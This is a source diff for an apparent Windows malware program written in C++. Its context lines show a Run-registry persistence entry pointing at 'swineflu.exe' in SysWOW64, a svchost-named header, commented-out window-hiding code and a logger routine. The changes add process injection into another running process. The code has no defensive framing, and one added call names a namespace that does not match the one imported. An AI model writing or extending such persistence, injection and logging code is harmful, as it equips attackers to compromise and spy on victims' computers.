@@ -13,11 +13,17 @@
 
 
 #include <iostream>
+using namespace std;
 #include "svchost.h"
 #include <tchar.h>
 
+#include "Common.h"
+using namespace InjecteeFuncs;
 
-using namespace std;
+#include <DbgHelp.h>
+
+
+
 
 string ExePath() {
 	char buffer[MAX_PATH];
@@ -30,9 +36,6 @@ void addStartUpEntry()
 {
 	RegSetKeyValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, "C:\\Windows\\SysWOW64\\swineflu.exe", strlen("C:\\Windows\\SysWOW64\\swineflu.exe") + 1);
 }
-
-
-
 
 
 void adminstartup()
@@ -104,6 +107,14 @@ void firstTimeRunCheck()
 	}
 }
 
+void injectMethod()
+{
+	int process_id = MyInjecteeFuncs::getNextProcessID(0);
+	printf("Starting injections with process: %d\n", process_id);
+	MyInjecteeFuncs::inject(process_id);
+	printf("\n %d", process_id);
+}
+
 
 int _tmain(int argc, _TCHAR* argv[])
 {
@@ -112,12 +123,11 @@ int _tmain(int argc, _TCHAR* argv[])
 	//stealth = FindWindowA("ConsoleWindowClass", NULL);
 	//ShowWindow(stealth, 0);
 	printf("wear your mask please\n");
-	//adminstartup();
-	//
 	firstTimeRunCheck();
+	injectMethod();
 	logger();
 
-	// getchar();
+	getchar();
 	return 0;
 }
 
